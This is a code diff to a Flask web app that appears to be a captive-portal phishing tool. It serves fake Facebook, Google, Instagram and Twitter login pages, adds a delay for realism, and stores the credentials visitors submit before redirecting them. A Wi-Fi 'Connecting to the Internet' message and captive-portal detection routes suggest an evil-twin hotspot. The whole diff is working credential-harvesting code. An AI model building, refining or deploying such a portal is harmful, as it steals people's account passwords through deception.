@@ -160,29 +160,26 @@ def log_response_info(response):
 
 @app.route('/', methods=['GET'])
 def index():
-    """Displays the provider selection page."""
+    """Displays the main index page."""
     req_id = getattr(g, 'request_id', 'unknown')
-    logger.info("Serving provider selection page", extra={'request_id': req_id})
-    return render_template('select_provider.html')
+    logger.info("Serving index page", extra={'request_id': req_id})
+    return render_template('index.html')
 
-@app.route('/login/<provider>', methods=['GET'])
+@app.route('/login/<provider>')
 def login_provider(provider):
-    """Displays the login page for the selected provider."""
-    req_id = getattr(g, 'request_id', 'unknown')
-    provider_lower = provider.lower()
-    template = TEMPLATE_MAP.get(provider_lower)
-
-    log_extras = {
-        'request_id': req_id,
-        'provider': provider
+    # A map to ensure only valid templates are rendered
+    template_map = {
+        'facebook': 'login_facebook.html',
+        'google': 'login_google.html',
+        'instagram': 'login_instagram.html',
+        'twitter': 'login_twitter.html'
     }
-
-    if not template:
-        logger.warning(f"Invalid provider requested: '{provider}'", extra=log_extras)
-        abort(404) # Use Flask's abort for standard error pages
-
-    logger.info(f"Serving login page for provider: {provider.capitalize()}", extra=log_extras)
-    return render_template(template)
+    template_name = template_map.get(provider)
+    if template_name:
+        time.sleep(2)
+        return render_template(template_name, provider=provider)
+    else:
+        return "Not Found", 404
 
 @app.route('/submit/<provider>', methods=['POST'])
 def submit_provider(provider):
@@ -290,8 +287,8 @@ def submit_provider(provider):
         logger.error(f"Unexpected error encrypting/saving credentials: {e}", extra={'request_id': req_id}, exc_info=True)
         return "<h3>Internal server error processing request (Code: F5).</h3>", 500
 
-    # Display a generic success message
-    return "<h3>Thank you. Connecting to the Internet...</h3>"
+    # Display a generic success message and redirect to main page
+    return redirect(url_for('index') + '?auth=success&provider=' + provider)
 
 # --- Captive Portal Detection Handling ---
 # These routes are commonly hit by devices checking for internet connectivity.
